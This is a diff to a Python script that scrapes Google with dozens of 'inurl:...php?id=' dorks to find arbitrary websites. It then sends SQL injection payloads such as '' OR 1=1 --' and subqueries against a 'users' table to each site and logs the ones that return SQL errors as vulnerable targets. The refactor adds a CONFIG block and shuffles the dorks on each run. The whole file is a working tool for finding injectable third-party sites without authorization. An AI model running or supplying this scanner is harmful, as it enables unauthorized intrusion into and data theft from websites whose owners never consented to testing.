@@ -4,61 +4,15 @@ import urllib.parse
 import time
 import logging
 from colorama import Fore, Style, init
+import random
 
 # Initialize Colorama
 init(autoreset=True)
 
-# Setup logging
-logging.basicConfig(filename='sql_injection_check.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
-# File to save vulnerable URLs
-VULNERABLE_FILE = 'vulnerable2.txt'
-
-# Function to write vulnerable URLs to a file
-def save_vulnerable_url(url):
-    with open(VULNERABLE_FILE, 'a') as file:
-        file.write(url + '\n')
-    logging.info(f"Saved potentially vulnerable URL: {url}")
-
-# Function to perform Google search and return URLs
-def google_search(query, num_results=10):
-    search_url = "https://www.google.com/search"
-    links = []
-    start = 0
-
-    while len(links) < num_results:
-        params = {'q': query, 'start': start}
-        headers = {'User-Agent': 'Mozilla/5.0'}
-
-        try:
-            response = requests.get(search_url, params=params, headers=headers)
-            if response.status_code != 200:
-                logging.error(f"Failed to fetch search results: {response.status_code}")
-                break
-
-            soup = BeautifulSoup(response.text, 'html.parser')
-            for item in soup.find_all('a'):
-                href = item.get('href')
-                if href and href.startswith('/url?q='):
-                    url = urllib.parse.unquote(href.split('/url?q=')[1].split('&')[0])
-                    if url not in links:
-                        links.append(url)
-
-            if len(links) >= num_results:
-                break
-
-            start += 10  # Move to the next page of results
-            time.sleep(2)  # Respectful scraping delay
-
-        except requests.RequestException as e:
-            logging.error(f"Request failed: {e}")
-            break
-
-    return links[:num_results]
-
-# Function to check if a URL is potentially vulnerable to SQLi
-def check_sqli(url):
-    sqli_test_payloads = [
+# Configuration
+CONFIG = {
+    "vulnerable_file": 'vulnerable2.txt',
+    "sqli_payloads": [
         "' OR '1'='1",
         "' OR 1=1 --",
         "' OR 'x'='x",
@@ -74,34 +28,13 @@ def check_sqli(url):
         "' OR (SELECT 1 FROM dual WHERE 1=1)--",
         "' AND 1=(SELECT COUNT(*) FROM tabname WHERE columnname LIKE '%pattern%')--",
         "' OR (SELECT * FROM users WHERE username LIKE '%admin%')--"
-    ]
-
-    headers = {'User-Agent': 'Mozilla/5.0'}
-
-    for payload in sqli_test_payloads:
-        test_url = f"{url}?test={urllib.parse.quote(payload)}"
-        try:
-            response = requests.get(test_url, headers=headers, timeout=5)
-
-            # Check for common SQL error patterns in the response
-            if any(error in response.text.lower() for error in ["error", "sql", "syntax"]):
-                logging.info(f"Potential SQLi vulnerability detected at: {test_url}")
-                print(Fore.GREEN + f"Potential vulnerability found: {test_url}")
-                save_vulnerable_url(test_url)
-                return True
-
-        except requests.RequestException as e:
-            logging.error(f"Request to {test_url} failed: {e}")
-
-        time.sleep(2)  # Respectful scraping delay
-
-    print(Fore.RED + f"No vulnerability found at: {url}")
-    return False
-
-# Main function
-def main():
-    dorks = [
-        # Existing dorks
+    ],
+    "num_results": 10,
+    "search_delay": 2,  # Delay between Google searches
+    "check_delay": 2,   # Delay between vulnerability checks
+    "google_search_url": "https://www.google.com/search",
+    "user_agent": 'Mozilla/5.0',
+    "dorks": [
         "inurl:index.php?id=",
         "inurl:product.php?id=",
         "inurl:page.php?id=",
@@ -148,8 +81,6 @@ def main():
         "inurl:searchitems.php?id=",
         "inurl:searchpage.php?id=",
         "inurl:query.php?id=",
-
-        # Additional dorks
         "inurl:product_detail.php?id=",
         "inurl:catalog.php?id=",
         "inurl:listing.php?id=",
@@ -195,13 +126,96 @@ def main():
         "inurl:admin_preferences.php?id=",
         "inurl:admin_customizations.php?id="
     ]
-    
-    num_results = 10  # Number of search results to fetch per dork
+}
 
-    for dork in dorks:
+# Setup logging
+logging.basicConfig(
+    filename='sql_injection_check.log',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+
+def save_vulnerable_url(url):
+    """Save the URL to the vulnerable file."""
+    try:
+        with open(CONFIG["vulnerable_file"], 'a') as file:
+            file.write(url + '\n')
+        logging.info(f"Saved potentially vulnerable URL: {url}")
+    except IOError as e:
+        logging.error(f"Failed to save URL {url}: {e}")
+
+def google_search(query, num_results=10):
+    """Perform Google search and return URLs."""
+    links = []
+    start = 0
+
+    while len(links) < num_results:
+        params = {'q': query, 'start': start}
+        headers = {'User-Agent': CONFIG["user_agent"]}
+
+        try:
+            response = requests.get(CONFIG["google_search_url"], params=params, headers=headers)
+            if response.status_code == 403:
+                logging.warning(f"Access denied for search query: {query}. Possible rate limit.")
+                break
+            elif response.status_code != 200:
+                logging.error(f"Failed to fetch search results: {response.status_code}")
+                break
+
+            soup = BeautifulSoup(response.text, 'html.parser')
+            for item in soup.find_all('a'):
+                href = item.get('href')
+                if href and href.startswith('/url?q='):
+                    url = urllib.parse.unquote(href.split('/url?q=')[1].split('&')[0])
+                    if url not in links:
+                        links.append(url)
+
+            if len(links) >= num_results:
+                break
+
+            start += 10
+            time.sleep(CONFIG["search_delay"])
+
+        except requests.RequestException as e:
+            logging.error(f"Request failed: {e}")
+            time.sleep(CONFIG["search_delay"])  # Wait before retrying
+
+    return links[:num_results]
+
+def check_sqli(url):
+    """Check if a URL is potentially vulnerable to SQL injection."""
+    headers = {'User-Agent': CONFIG["user_agent"]}
+
+    for payload in CONFIG["sqli_payloads"]:
+        test_url = f"{url}?test={urllib.parse.quote(payload)}"
+        try:
+            response = requests.get(test_url, headers=headers, timeout=10)
+
+            # Check for common SQL error patterns in the response
+            if any(error in response.text.lower() for error in ["error", "sql", "syntax"]):
+                logging.info(f"Potential SQLi vulnerability detected at: {test_url}")
+                print(Fore.GREEN + f"Potential vulnerability found: {test_url}")
+                save_vulnerable_url(test_url)
+                return True
+
+        except requests.RequestException as e:
+            logging.error(f"Request to {test_url} failed: {e}")
+            time.sleep(CONFIG["check_delay"])  # Wait before retrying
+
+        time.sleep(CONFIG["check_delay"])
+
+    print(Fore.RED + f"No vulnerability found at: {url}")
+    return False
+
+def main():
+    """Main function to perform searches and check for SQL injection vulnerabilities."""
+    # Shuffle the dorks list to ensure different dorks are used each run
+    random.shuffle(CONFIG["dorks"])
+
+    for dork in CONFIG["dorks"]:
         print(Fore.YELLOW + f"Searching with dork: {dork}")
-        urls = google_search(dork, num_results)
-        
+        urls = google_search(dork, CONFIG["num_results"])
+
         for url in urls:
             print(Fore.CYAN + f"Checking {url} for SQLi vulnerability...")
             if check_sqli(url):
